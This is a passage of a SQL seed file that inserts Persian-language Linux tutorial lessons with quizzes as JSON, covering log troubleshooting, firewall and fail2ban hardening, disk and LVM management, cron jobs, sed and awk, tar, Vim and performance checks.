درخواست‌ها","tail -f /var/log/nginx/error.log"],["dmesg","پیام‌های هسته و سخت‌افزار","dmesg | tail"]]},{"k":"warn","title":"دام رایج","t":"پاک‌کردن لاگ‌ها با rm برای «آزادکردن دیسک» در حالی که process هنوز آن را باز دارد — فضا آزاد نمی‌شود چون فایل باز است! راه درست: logrotate یا : > /var/log/file (خالی‌کردن بدون حذف inode). و df -h پر نشان می‌دهد ولی ls چیزی نمی‌بینی؟ lsof | grep deleted دنبال فایل‌های حذف‌شده ولی باز بگرد."},{"k":"tip","title":"نکته حرفه‌ای","t":"عادت طلایی: هر سرویسی که می‌سازی، یک healthcheck ساده داشته باشد و لاگ‌هایش ساختاریافته (JSON) باشند. روزی که ۳ صبح بیدار می‌شوی، grep روی JSON با فیلتر level=error در چند ثانیه جواب می‌دهد — و همان چند ثانیه، تفاوت «رفع شد» و «دو ساعت جست‌وجو» است."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["journalctl -u سرویس اولین مقصد؛ سطح‌های لاگ ابزار فیلتر.","شش‌قدم عیب‌یابی: status ← لاگ ← پورت ← دیسک ← حافظه ← dmesg.","لاگ‌ها را نپاک کن؛ بچرخان (logrotate) و ساختاریافته بنویس."]}]'::jsonb, '[{"q":"journalctl -u nginx --since today چه می‌کند؟","opts":["nginx را از اول نصب می‌کند","فقط لاگ سرویس nginx از ابتدای امروز را نشان می‌دهد","لاگ‌ها را پاک می‌کند","nginx را ری‌استارت می‌کند"],"ans":1,"why":"u- فیلتر سرویس و since- فیلتر زمان — ترکیبی که «لاگ‌های مربوط» را از هزاران خط جدا می‌کند."},{"q":"اولین فرمان وقتی سرویسی پاسخ نمی‌دهد چیست؟","opts":["reboot","systemctl status — آیا اصلاً زنده است یا failed شده","rm لاگ‌ها","apt upgrade"],"ans":1,"why":"قبل از هر کاری باید بدانی سرویس مرده، در حال ری‌استارت، یا زنده ولی گرفتار — هر کدام درمان متفاوتی دارند."},{"q":"چرا rm روی لاگِ باز، دیسک را آزاد نمی‌کند؟","opts":["چون لاگ قفل شده","چون تا process فایل را نبندد، inode و بلوک‌هایش آزاد نمی‌شوند","چون logrotate اجازه نمی‌دهد","آزاد می‌کند"],"ans":1,"why":"حذف فقط نام را از دایرکتوری برمی‌دارد؛ داده تا بسته‌شدن آخرین descriptor می‌ماند — برای همین lsof | grep deleted گاهی گیگ‌ها را لو می‌دهد."}]'::jsonb),
('ub-r10', 'linux', 'امنیت و سخت‌سازی؛ سروری که خودش از خودش دفاع می‌کند', 55, 10, '[{"k":"p","t":"هر سروری که به اینترنت وصل است، از همان دقیقه اول در حال اسکن‌شدن است — ربات‌ها ۲۴ ساعته پورت ۲۲ و رمزهای ضعیف را امتحان می‌کنند. امنیت لینوکس یعنی لایه‌هایی از دفاع ساده که هرکدام به‌تنهایی کوچک‌اند، ولی با هم سرور را عملاً غیرقابل‌نفوذ می‌کنند."},{"k":"h","t":"لایه اول؛ درها را بشمار"},{"k":"p","t":"فایروال UFW ساده‌ترین فایروال دنیاست: ufw default deny incoming همه ورودی‌ها را می‌بندد، ufw allow 22 فقط SSH را باز می‌کند و ufw enable فعال می‌کند. قبل از enable حتماً پورت SSH باز باشد — وگرنه خودت را بیرون می‌کنی! روی سرور وب: فقط 22 و 80 و 443. هر پورت بازِ بی‌دلیل، یک درِ باز برای مهاجم است؛ و auth.log را که ببینی، هزاران تلاش ورود از چین و روسیه را با چشم خودت می‌خوانی."},{"k":"h","t":"لایه دوم؛ خسته‌کردن مهاجم"},{"k":"p","t":"fail2ban لاگ‌های ورود را می‌خواند و IPهایی که چند بار شکست خوردند را موقتاً بن می‌کند — خودکار و بی‌صدا. روی SSH با کلید تقریباً بی‌نیاز است (چون اصلاً رمز نیست که حدس بزنند)، ولی هر سرویس رمزدار دیگری که به اینترنت وصل است، fail2ban می‌خواهد. و تغییر پورت پیش‌فرض SSH هم اگرچه «امنیت با ابهام» است، حجم نویز لاگ را به‌شدت کم می‌کند."},{"k":"h","t":"لایه سوم؛ عمق دفاع"},{"k":"p","t":"AppArmor (فعال پیش‌فرض اوبونتو) حتی اگر سرویسی هک شود، اجازه‌هایش را محدود می‌کند — مهاجم داخل nginx زندانی می‌ماند. به‌روزرسانی‌های امنیتی خودکار (درس apt) وصله‌ها را می‌رساند. کاربرهای سرویس جدا (www-data به‌جای root) آسیب را محصور می‌کنند. و حساب‌های بی‌مصرف و sudoهای قدیمی باید دوره‌ای پاک شوند. هیچ‌کدام به‌تنهایی کافی نیستند؛ ترکیب‌شان است که مهاجم را از «سودآور» به «بی‌خیال» می‌رساند."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"bash","title":"سخت‌سازی سرور تازه‌نصب","code":"# ۱. فایروال: همه بسته جز این‌ها\nsudo ufw default deny incoming\nsudo ufw default allow outgoing\nsudo ufw allow 22/tcp        # SSH (قبل از enable!)\nsudo ufw allow 80,443/tcp    # وب\nsudo ufw enable\nsudo ufw status numbered\n\n# ۲. fail2ban برای SSH\nsudo apt install fail2ban -y\nsudo systemctl enable --now fail2ban\nsudo fail2ban-client status sshd\n# IPهای بن‌شده همین حالا هم هستند!\n\n# ۳. ببین چه کسانی وارد شده‌اند\nlast -5                      # ورودهای موفق\ngrep ''Failed password'' /var/log/auth.log | tail"},{"k":"list","items":["default deny یعنی همه‌چیز بسته مگر آنچه صریح باز شده — برعکس فایروال‌های خانگی که همه‌چیز باز است.","status numbered فهرست قوانین با شماره می‌دهد؛ برای حذف یک قانون: ufw delete 2.","fail2ban روی اوبونتو برای SSH از پیش تنظیم شده — فقط نصب و فعال‌سازی کافی است.","last و grep روی auth.log همان چیزی‌اند که بعد از هر شک امنیتی، بازرس‌ها اول می‌خوانند — خودت هم عادت کن."]},{"k":"def","term":"دفاع عمیق (Defense in Depth)","t":"چیدن چند لایه دفاع مستقل که شکستن هرکدام به‌تنهایی کافی نباشد: فایروال در شبکه، کلید در ورود، fail2ban در ورودی‌ها، AppArmor در اجرا، وصله‌ها در نرم‌افزار. مهاجم باید همه را همزمان بشکند — و معمولاً سراغ هدف آسان‌تر می‌رود."},{"k":"table","head":["لایه","ابزار","اثر"],"rows":[["شبکه","UFW","فقط پورت‌های لازم باز"],["ورود","کلید SSH + بستن رمز","حذف Brute-force"],["ورود","fail2ban","بن خودکار IPهای مشکوک"],["اجرا","AppArmor","محصورکردن سرویس هک‌شده"],["نرم‌افزار","unattended-upgrades","وصله خودکار CVEها"]]},{"k":"warn","title":"دام رایج","t":"فعال‌کردن ufw enable بدون بازکردن پورت SSH — و قطع‌شدن دسترسی خودت به سرور. همیشه ترتیب: اول allow 22، بعد enable، بعد از همان ترمینال با یک ssh جدید تست کن. این اشتباه در ابرها با کنسول وب قابل‌جبران است، ولی روی سرور فیزیکی یعنی راه‌افتادن به اتاق سرور."},{"k":"tip","title":"نکته حرفه‌ای","t":"ماه‌ها یک‌بار این گزارش را برای خودت تولید کن: ss -tulpn (پورت‌های باز)، last (ورودها)، apt list --upgradable (وصله‌های عقب‌افتاده). ده دقیقه است و دقیقاً همان «بازرسی دوره‌ای» است که استانداردهای امنیت جدی می‌خواهند — بدون هیچ ابزار پولی."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["UFW با default deny؛ فقط پورت‌های لازم باز — و SSH قبل از enable.","کلید SSH + fail2ban + بستن ورود رمز = پایان Brute-force.","دفاع عمیق: لایه‌های کوچک مستقل که با هم نفوذ را بی‌صرفه می‌کنند."]}]'::jsonb, '[{"q":"چرا ufw default deny incoming انتخاب درست سرور است؟","opts":["سریع‌تر است","هر سرویس جدید به‌جای خودکار در دسترس‌بودن، نیازمند تصمیم صریح بازکردن است","اجباری اوبونتو است","پهنای باند را کم می‌کند"],"ans":1,"why":"با deny پیش‌فرض، فراموشی یعنی «دسترسی نداریم و متوجه می‌شویم» — نه «نفوذ شده و نمی‌دانیم». جهت امن، سمت سخت‌گیری است."},{"q":"fail2ban چطور کار می‌کند؟","opts":["رمزها را رمزنگاری می‌کند","لاگ‌ها را می‌خواند و IPهایی که چند بار شکست خوردند را موقتاً بن می‌کند","پورت‌ها را عوض می‌کند","ویروس‌کشی می‌کند"],"ans":1,"why":"با چند شکست، ادامه تلاش بی‌معنی می‌شود — میلیون‌ها حمله رباتیک با همین مکانیزم ساده خنثی می‌شوند."},{"q":"AppArmor حتی بعد از هک‌شدن سرویس چه کمکی می‌کند؟","opts":["هک را برمی‌گرداند","برنامه را به فایل‌ها و قابلیت‌های مجازش محدود می‌کند تا مهاجم نتواند از آن فرار کند","رمز را عوض می‌کند","لاگ می‌گیرد"],"ans":1,"why":"مهاجم داخل nginx فقط دسترسی‌های nginx را دارد — نه کل سیستم. این «محصورسازی» همان چیزی است که یک نفوذ را از فاجعه به حادثه کوچک تقلیل می‌دهد."}]'::jsonb),
('ub-r11', 'linux', 'دیسک و ذخیره‌سازی؛ از df تا fstab', 50, 11, '[{"k":"p","t":"«دیسک پر شد» از آن خطاهاست که تا سرِ خودت نیاید باورش نمی‌کنی — و وقتی بیاید، همه‌چیز را با هم می‌آورد: دیتابیس قفل می‌کند، لاگ نوشته نمی‌شود، سرویس‌ها یکی‌یکی می‌میرند. مدیریت دیسک مهارتی است که یک مدیر سرور را از بقیه جدا می‌کند."},{"k":"h","t":"دیدن فضا؛ df و du"},{"k":"p","t":"df -h فضای هر mount را نشان می‌دهد — ستون Use% عددی است که مانیتور می‌کنی. ولی وقتی df می‌گوید «پر» و نمی‌دانی چرا، du وارد می‌شود: du -h --max-depth=1 / بزرگ‌ترین ساکنان ریشه را لو می‌دهد، و بعد روی شاخه مشکوک تکرارش می‌کنی تا مقصر پیدا شود. معمولاً یا /var/log (لاگ‌های نچرخیده) یا /tmp یا کش‌های فراموش‌شده. و ncdu نسخه تعاملی du است که با فلش‌ها درخت را می‌پیمایی — نصبش ارزش هر سروری را دارد."},{"k":"h","t":"Mount؛ اتصال دیسک به درخت"},{"k":"p","t":"در لینوکس دیسک‌ها «درایو C و D» ندارند؛ به نقطه‌ای از درخت mount می‌شوند: mount /dev/sdb1 /data یعنی محتوای آن پارتیشن از این‌به‌بعد زیر /data دیده می‌شود. ولی mount دستی بعد از ری‌استارت می‌پرد — برای ماندگاری، /etc/fstab جدول رسمی است: UUID پارتیشن، نقطه mount و گزینه‌ها. قبل از هر تغییر fstab، blkid را برای UUID درست بزن و بعد از ویرایش mount -a بزن تا بدون ریسک ری‌استارت، تنظیمات را تست کنی — خطای fstab می‌تواند بوت را کلاً متوقف کند."},{"k":"h","t":"LVM؛ دیسکِ انعطاف‌پذیر"},{"k":"p","t":"مدیریت حجم منطقی (LVM) یک لایه انتزاع بین دیسک فیزیکی و پارتیشن می‌گذارد: چند دیسک را در یک Volume Group می‌ریزی و از آن Logical Volumeهای هر اندازه می‌بری — و بعداً بدون خاموشی، بزرگ‌ترشان می‌کنی (lvextend + resize2fs). روی سرور جدی، روت را هم از روز اول روی LVM نصب کن؛ روزی که فضا کم بیاوری، فقط یک دیسک اضافه می‌کنی و یک فرمان می‌زنی. پارتیشن‌بندی سنتی در آن روز، یعنی مهاجرت داده و ساعت‌ها استرس."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"bash","title":"پیداکردن مقصر دیسک پر","code":"df -h\n# /dev/sda1  50G  49G  100M  100% /   ← روت پر است!\n\ndu -h --max-depth=1 / 2>/dev/null | sort -rh | head\n# 38G   /var\n# 8G    /usr ...\n\ndu -h --max-depth=1 /var | sort -rh | head -3\n# 35G   /var/log     ← مقصر پیدا شد!\n\nls -lhS /var/log | head -5\n# -rw-r--r--  1 root root 34G app.log   ← یک فایل!\n\n# درمان فوری (بدون شکستن process باز):\nsudo truncate -s 0 /var/log/app.log\n# درمان واقعی: logrotate برای این سرویس"},{"k":"list","items":["الگوی دو مرحله‌ای: df نشان می‌دهد کدام mount، du درختی پایین می‌رود تا فایل — مثل جست‌وجوی دودویی روی فضا.","2>/dev/null خطاهای «اجازه نداری» را ساکت می‌کند تا خروجی تمیز بماند.","truncate -s 0 فایل را خالی می‌کند بدون حذفش — چون process هنوز آن را باز دارد، rm اینجا فضا را آزاد نمی‌کرد (درس لاگ‌ها).","و درمان موقت بدون درمان ریشه‌ای (logrotate) یعنی هفته بعد دوباره ۱۰۰٪ — همیشه هر دو."]},{"k":"def","term":"Mount Point","t":"نقطه‌ای از درخت دایرکتوری‌ها که یک دیسک یا پارتیشن به آن وصل می‌شود — بعد از mount، زیرشاخه‌های آن نقطه محتوای دیسک جدیدند. این ایده که «دیسک، زیرشاخه است» (نه درایو جدا) یکی از تفاوت‌های بنیادی لینوکس با ویندوز است."},{"k":"table","head":["فرمان","کاربرد"],"rows":[["df -h","فضای mountها — آیا پر است؟"],["du -h --max-depth=1","چه چیزی فضا گرفته؟"],["ncdu /","پیمایش تعاملی فضا"],["blkid","UUID پارتیشن‌ها برای fstab"],["mount -a","تست fstab بدون ری‌استارت"],["lvextend + resize2fs","بزرگ‌کردن آنلاین LVM"]]},{"k":"warn","title":"دام رایج","t":"ویرایش fstab و ری‌استارت بدون mount -a. یک UUID اشتباه یا typo در fstab می‌تواند سیستم را وسط بوت در emergency shell متوقف کند — و روی سرور ابری بدون کنسول، یعنی دردسر جدی. همیشه mount -a: اگر خطا داد، هنوز داخل سیستمی و می‌توانی اصلاح کنی."},{"k":"tip","title":"نکته حرفه‌ای","t":"برای سرورهای تولید، مانیتورینگ فضا را از روز اول بگذار: یک cron ساده که وقتی df از ۸۵٪ رد شد ایمیل/پیام بفرستد. دیسک هیچ‌وقت «ناگهانی» پر نمی‌شود — همیشه هفته‌ها از ۷۰ به ۱۰۰ می‌رود؛ کسی که هشدار ۸۵٪ دارد، هرگز صفحه «دیسک پر» را نمی‌بیند."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["df برای وضعیت کلی؛ du/ncdu برای شکار مقصر؛ truncate برای فایل‌های باز.","fstab ماندگاری mount است؛ قبل از ری‌استارت همیشه mount -a برای تست.","LVM را از ابتدا انتخاب کن تا بزرگ‌کردن دیسک یک فرمان باشد، نه یک پروژه."]}]'::jsonb, '[{"q":"تفاوت df و du چیست؟","opts":["فرقی ندارند","df فضای هر mount را از دید فایل‌سیستم و du مصرف واقعی دایرکتوری‌ها را نشان می‌دهد","df برای SSD و du برای HDD است","du فقط برای شبکه"],"ans":1,"why":"وقتی df پر می‌گوید و نمی‌دانی چرا، du درختی پایین می‌رود تا مقصر را پیدا کند — دو مکمل، نه جایگزین."},{"q":"چرا قبل از ری‌استارت بعد از ویرایش fstab باید mount -a زد؟","opts":["برای سرعت بوت","چون خطای fstab بدون تست می‌تواند سیستم را در بوت بعدی متوقف کند؛ mount -a خطا را زنده و امن نشان می‌دهد","اجباری نیست","برای کش"],"ans":1,"why":"fstab تنها فایلی است که اشتباهش را بعد از خاموش‌شدن سیستم می‌فهمی — mount -a تنها راه تست امن آن است."},{"q":"مزیت اصلی LVM چیست؟","opts":["امنیت بیشتر","امکان تغییر اندازه حجم‌ها (مثل بزرگ‌کردن آنلاین) بدون پارتیشن‌بندی دوباره و از دست‌رفتن داده","سرعت بیشتر دیسک","فشرده‌سازی"],"ans":1,"why":"در دنیای واقعی دیسک‌ها «روز اول کافی‌اند و روز سی‌ام نیستند»؛ LVM بزرگ‌کردن را از یک عملیات پرریسک به یک فرمان تبدیل می‌کند."}]'::jsonb),
('ub-r12', 'linux', 'اتوماسیون با cron و systemd timer؛ کاری که دیگر انجام نمی‌دهی', 45, 12, '[{"k":"p","t":"مهندس خوب تنبل است — تنبلِ هوشمند: هر کار تکراری را یک‌بار اتوماتیک می‌کند و بعد برای همیشه فراموشش می‌کند. پشتیبان‌گیری، پاک‌سازی لاگ، به‌روزرسانی گزارش‌ها — هیچ‌کدام نباید به «یادِ کسی» وابسته باشند."},{"k":"h","t":"cron؛ قدیمی و هنوز بی‌رقیب"},{"k":"p","t":"crontab -e جدول کارهای زمان‌بندی‌شده کاربر را باز می‌کند. هر خط پنج فیلد زمان دارد: دقیقه، ساعت، روز ماه، ماه، روز هفته — و بعد فرمان. ستاره یعنی «هر»: 30 2 * * * یعنی هر روز ساعت ۲:۳۰ بامداد. */15 یعنی هر ۱۵ دقیقه. دو نکته حیاتی که تازه‌کارها را می‌گیرد: مسیرها — cron با PATH حداقلی اجرا می‌شود، پس فرمان‌ها را با مسیر کامل بنویس؛ و خروجی — اگر فرمان چیزی چاپ کند و تو نبینی، ایمیل می‌شود یا گم می‌شود؛ خروجی را به لاگ هدایت کن: >> /var/log/backup.log 2>&1."},{"k":"h","t":"systemd timer؛ جایگزین مدرن"},{"k":"p","t":"timerهای systemd همان کار cron را با امکانات مهندسی‌تر انجام می‌دهند: وابستگی به unitها، لاگ خودکار در journalctl، اجرای عقب‌افتاده بعد از بالاآمدن سیستم (Persistent=true) و دقت بهتر. یک timer دو فایل می‌خواهد: mytask.timer (کی) و mytask.service (چه). OnCalendar=daily برای روزانه و OnUnitActiveSec=1h برای «هر ساعت بعد از اجرای قبل». برای کارهای جدیدِ روی اوبونتو، timer انتخاب بهتری است؛ ولی cron هنوز در همه‌جا هست و خواندنش را باید بلد باشی."},{"k":"h","t":"قاعده «یک‌بار بنویس، برای همیشه»"},{"k":"p","t":"هر کاری که سومین بار دستی انجامش می‌دهی، کاندید اتوماسیون است — ولی اتوماسیونِ بی‌نظارت خطرناک‌تر از کار دستی است. پس هر job سه چیز داشته باشد: لاگِ قابل‌خواندن (که بدانی دیشب اجرا شد یا نه)، بررسی موفقیت (کد خروج و در صورت لزوم هشدار) و idempotence — یعنی اگر دو بار اجرا شد، دو برابر اثر نگذارد (پشتیبان‌گیری با نام تاریخ‌دار idempotent است؛ append به دیتابیس بدون کلید یکتا نیست)."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"bash","title":"crontab -e — سه کار واقعی","code":"# هر روز ۳ بامداد: پشتیبان‌گیری با لاگ\n0 3 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1\n\n# هر یکشنبه ۴ بامداد: پاک‌سازی tmp قدیمی\n0 4 * * 0 find /tmp -type f -mtime +7 -delete\n\n# هر ۵ دقیقه: بررسی زنده‌بودن API و راه‌اندازی مجدد\n*/5 * * * * curl -fs http://localhost:8000/health \\\n    || systemctl --user restart myapp\n\n# خواندن جدول فعلی:\ncrontab -l"},{"k":"list","items":["فرمان‌ها با مسیر کامل (/usr/local/bin/...) — چون PATH محیط cron حداقلی است و backup.sh خالی پیدا نمی‌شود.","2>&1 یعنی خطاها هم به همان لاگ بروند — وگرنه شکست‌ها بی‌صدا گم می‌شوند و ماه‌ها نمی‌فهمی پشتیبان‌گیری از هفته اول مرده.","خط سوم یک «watchdog» ساده است: اگر healthcheck پاس نداد، سرویس را برگردان — خودترمیمی با دو ابزار استاندارد.","* * 0 یعنی روز هفته صفر = یکشنبه — ستاره‌های روز ماه و روز هفته «یا» هستند، نه «و»؛ یکی از ظریف‌ترین نکات cron."]},{"k":"def","term":"Idempotence","t":"ویژگی عملی که تکرارش نتیجه را تغییر نمی‌دهد: mkdir -p یا «کپی اگر نبود» idempotent‌اند؛ «افزودن یک ردیف» نیست. کارهای زمان‌بندی‌شده چون ممکن است تکراری اجرا شوند (بعد از خرابی، دستی، دوبار)، باید idempotent طراحی شوند."},{"k":"table","head":["الگوی cron","معنی"],"rows":[["0 3 * * *","هر روز ساعت ۳:۰۰"],["*/15 * * * *","هر ۱۵ دقیقه"],["0 4 * * 0","هر یکشنبه ساعت ۴"],["0 0 1 * *","اول هر ماه، نیمه‌شب"],["30 2 * * 1-5","روزهای کاری ساعت ۲:۳۰"]]},{"k":"warn","title":"دام رایج","t":"نوشتن job در crontab با % — در cron، % معنای ویژه دارد (شروع ورودی stdin) و فرمان را می‌شکند؛ باید \\% نوشته شود. و دوم: تست‌نکردن فرمانِ cron قبل از زمان‌بندی — همیشه اول دستی اجرا کن، ببین کار می‌کند و لاگ می‌نویسد، بعد به cron بسپارش."},{"k":"tip","title":"نکته حرفه‌ای","t":"برای هر job حیاتی (مخصوصاً پشتیبان‌گیری) یک «تست بازیابی» دوره‌ای بگذار: ماهی یک‌بار واقعاً یک پشتیبان را در ماشین تست برگردان. پشتیبانی که هرگز تست بازیابی نشده، پشتیبان نیست — امید است. این جمله روی دیوار هر تیم زیرساختی باید باشد."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["پنج فیلد زمان + فرمان؛ مسیر کامل و هدایت خروجی به لاگ حیاتی‌اند.","systemd timer برای کارهای جدید: لاگ‌دار، وابستگی‌دار، قابل‌اعتمادتر.","هر job باید لاگ، بررسی موفقیت و idempotence داشته باشد."]}]'::jsonb, '[{"q":"معنی دقیق 0 3 * * * چیست؟","opts":["هر ۳ دقیقه","هر روز ساعت ۳:۰۰ بامداد","روز سوم هر ماه","هر ۳ ساعت"],"ans":1,"why":"دقیقه=۰، ساعت=۳، و سه ستاره یعنی هر روز/ماه/هفته — ستاره یعنی «مهم نیست کدام»."},{"q":"چرا فرمان‌های cron باید مسیر کامل داشته باشند؟","opts":["برای امنیت","چون cron با PATH حداقلی اجرا می‌شود و فرمان‌های بدون مسیر را پیدا نمی‌کند","اجباری نیست","برای سرعت"],"ans":1,"why":"کلاسیک‌ترین «کار نمی‌کند ولی دستی کار می‌کند»: در shell تو PATH کامل هست، در cron فقط /usr/bin:/bin — پس /usr/local/bin/backup.sh لازم است."},{"q":"Idempotent بودن job یعنی چه و چرا مهم است؟","opts":["یعنی سریع باشد","یعنی اجرای تکراری‌اش نتیجه را عوض نکند — چون jobها ممکن است دوبار اجرا شوند و اثر دو برابر خطرناک است","یعنی فشرده باشد","یعنی رمز شده باشد"],"ans":1,"why":"وقتی watchdog یا اجرای دستیِ فراموش‌شده job را دوباره بزند، idempotence فرق «بی‌ضرر» و «خراب‌شده» است."}]'::jsonb),
('ub-c1', 'linux', 'پردازش متن با sed و awk', 40, 13, '[{"k":"p","t":"grep پیدا می‌کند؛ sed و awk «تبدیل» می‌کنند. sed ویرایشگر جریان است: خط می‌گیرد، تبدیل می‌کند، رد می‌کند — s/old/new/g جایگزینی کلاسیک است. awk یک زبان کامل برای ستون‌هاست: هر خط را به فیلد می‌شکند ($1، $2...) و جمع و فیلتر و گزارش می‌سازد. ترکیب این سه با sort و uniq، ابزار گزارش‌گیری از هر لاگی است."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["sed ''s/foo/bar/g'' file — جایگزینی در همه خط‌ها","sed -i ویرایش درجا (با احتیاط!) — حتماً قبلش نسخه پشتیبان","awk ''{print $1, $3}'' ستون‌های ۱ و ۳ را چاپ می‌کند","awk -F: ''{print $1}'' /etc/passwd — جداکننده دونقطه","sort | uniq -c | sort -rn — شمارش تکرارها و مرتب‌سازی"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"bash","title":"سه گزارش از یک لاگ","code":"# پرتکرارترین IPها در access.log\nawk ''{print $1}'' access.log | sort | uniq -c | sort -rn | head\n\n# مجموع بایت‌های منتقل‌شده (ستون ۱۰)\nawk ''{sum += $10} END {print sum/1024/1024 \" MB\"}'' access.log\n\n# حذف همه کامنت‌ها از یک تنظیمات\nsed ''/^#/d; /^$/d'' nginx.conf"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: sed ''s/foo/bar/g'' file — جایگزینی در همه خط‌ها بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"تفاوت grep و sed چیست؟","opts":["فرقی ندارند","grep فقط پیدا و فیلتر می‌کند؛ sed متن را تبدیل/جایگزین می‌کند","sed سریع‌تر است","grep برای فایل نیست"],"ans":1,"why":"این سه ابزار مکمل‌اند: grep پیدا کن، sed تبدیل کن، awk ستون‌ها را گزارش کن."}]'::jsonb),
('ub-c2', 'linux', 'tar و فشرده‌سازی؛ جابه‌جایی و آرشیو', 35, 14, '[{"k":"p","t":"tar چند فایل و دایرکتوری را در یک آرشیو می‌گذارد (بدون فشرده‌سازی ذاتی) و پرچم‌های z (gzip) یا J (xz) فشرده‌سازی را اضافه می‌کنند. سه ترکیب را حفظ کن: czf برای ساخت، xzf برای بازکردن، tzf برای دیدن فهرست بدون بازکردن. نام‌گذاری معنادار با تاریخ (backup-2026-03-14.tar.gz) آینده‌ات را نجات می‌دهد."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["tar -czf archive.tar.gz /path — ساخت + gzip","tar -xzf archive.tar.gz -C /target — بازکردن در مقصد","tar -tzf archive.tar.gz — فقط فهرست (بررسی صحت)","J- فشرده‌تر از z- ولی کندتر — برای آرشیوهای بلندمدت","tar خودش ساختار دایرکتوری‌ها را حفظ می‌کند"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"bash","title":"چرخه کامل آرشیو","code":"# ساخت با نام تاریخ‌دار\ntar -czf db-backup-$(date +%F).tar.gz /var/lib/app\n\n# بررسی قبل از پاک‌کردن قدیمی‌ها\ntar -tzf db-backup-2026-03-14.tar.gz | head\n\n# بازگردانی در دایرکتوری موقت (هرگز مستقیم روی زنده!)\nmkdir /tmp/restore && tar -xzf db-backup-2026-03-14.tar.gz -C /tmp/restore"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: tar -czf archive.tar.gz /path — ساخت + gzip بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"tar -tzf چه می‌کند؟","opts":["آرشیو را می‌سازد","فهرست محتوای آرشیو را بدون بازکردن نشان می‌دهد — برای بررسی صحت","فشرده‌سازی را بیشتر می‌کند","پاک می‌کند"],"ans":1,"why":"قبل از اعتماد به هر آرشیو و پاک‌کردن نسخه قبلی، tzf آن را بخوان — پشتیبان خرابِ کشف‌نشده، پشتیبان نیست."}]'::jsonb)
INSERT INTO lessons (id, course_id, title, minutes, sort_order, blocks, quiz) VALUES
('ub-c3', 'linux', 'Vim؛ ویرایشگری که روی هر سروری هست', 45, 15, '[{"k":"p","t":"Vim را نه برای عشق، که برای ضرورت یاد بگیر: روی هر سرور لینوکسی نصب است و روزی تنها ویرایشگر توست. ذهنیتش «حالت» است: در حالت فرمان (Esc) با i وارد ویرایش می‌شوی و با :wq ذخیره و خروج. ده فرمان اول را که بدانی، از ۹۰٪ موقعیت‌ها زنده بیرون می‌آیی — بقیه را سال‌ها کم‌کم."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["i وارد ویرایش؛ Esc برگشت به حالت فرمان",":w ذخیره، :q خروج، :wq هر دو، :q! خروج بدون ذخیره (اضطراری)","dd حذف خط، yy کپی، p جای‌گذاری، u واگرد","/عبارت جست‌وجو و n بعدی؛ :%s/a/b/g جایگزینی سراسری","gg ابتدای فایل، G انتها، :12 خط ۱۲"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"bash","title":"نجات با vim","code":"# بازکردن تنظیمات\nsudo vim /etc/hosts\n\n# داخل vim:\n#   /localhost      → پیدا کردن خط\n#   i               → ویرایش\n#   Esc             → پایان ویرایش\n#   :wq             → ذخیره و خروج"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: i وارد ویرایش؛ Esc برگشت به حالت فرمان بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"در vim چطور بدون ذخیره خارج می‌شوی؟","opts":[":q",":q! — خروج اجباری بدون ذخیره تغییرات","Esc Esc","Ctrl+C"],"ans":1,"why":":q وقتی تغییر ذخیره‌نشده باشد امتناع می‌کند؛ :q! یعنی «می‌دانم چه می‌کنم، رهایش کن» — فرمان نجات وقتی همه‌چیز خراب شده."}]'::jsonb),
('ub-c4', 'linux', 'کارایی سیستم؛ خواندن فشار ماشین', 40, 16, '[{"k":"p","t":"«سیستم کند است» بدون عدد یعنی هیچ. چهار فرمان وضعیت را می‌خوانند: uptime برای بار (Load Average)، free -h برای حافظه، df -h برای دیسک و htop برای processها. Load Average میانگین صف اجرا در ۱، ۵ و ۱۵ دقیقه است — اگر از تعداد هسته‌ها بیشتر باشد، ماشین واقعاً زیر فشار است (nproc تعداد هسته‌ها را می‌گوید)."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["uptime — بار ۱/۵/۱۵ دقیقه‌ای؛ مقایسه با nproc","free -h — ستون available مهم‌تر از free است (کش‌ها)","htop — زنده، مرتب‌شونده، با F6 قابل‌تغییر معیار","iostat و vmstat برای دیسک و حافظه در طول زمان","sar (بسته sysstat) تاریخچه کارایی را نگه می‌دارد"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"bash","title":"چکاپ ۳۰ ثانیه‌ای","code":"uptime && nproc\n# load 3.8 روی 4 هسته → مرز فشار\n\nfree -h\n# available: 1.2G → هنوز نفس دارد\n\ntop -b -n1 | head -12\n# خروجی یک‌باره برای گزارش/لاگ"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: uptime — بار ۱/۵/۱۵ دقیقه‌ای؛ مقایسه با nproc بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"Load Average برابر ۸ روی ماشین ۴ هسته‌ای یعنی چه؟","opts":["سرعتش ۸ برابر است","به‌طور میانگین ۸ کار منتظر ۴ هسته‌اند — فشار دو برابر ظرفیت","۸ process 